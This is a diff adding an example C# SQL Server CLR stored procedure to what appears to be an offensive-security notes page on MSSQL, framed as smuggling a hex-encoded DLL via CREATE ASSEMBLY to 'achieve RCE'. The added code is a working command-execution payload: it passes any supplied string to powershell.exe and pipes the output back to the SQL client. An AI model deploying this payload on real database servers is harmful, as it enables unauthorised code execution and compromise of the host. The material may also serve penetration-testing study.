@@ -99,6 +99,44 @@ $stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
 
 ### Pass the hex encoded DLL file in the create assembly query to smuggle exe and achieve RCE.
 
+Example managed DLL file
+```C#
+using Microsoft.SqlServer.Server;
+using System;
+using System.Collections.Generic;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+public class StoredProcedure
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmdExec(SqlString execCommand)
+    {
+        // TODO
+
+        Process proc = new Process();
+        proc.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+        proc.StartInfo.Arguments = String.Format("-Command {0}",execCommand);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+        SqlContext.Pipe.SendResultsStart(record);
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
+    }
+}
+
+```
 
 
 
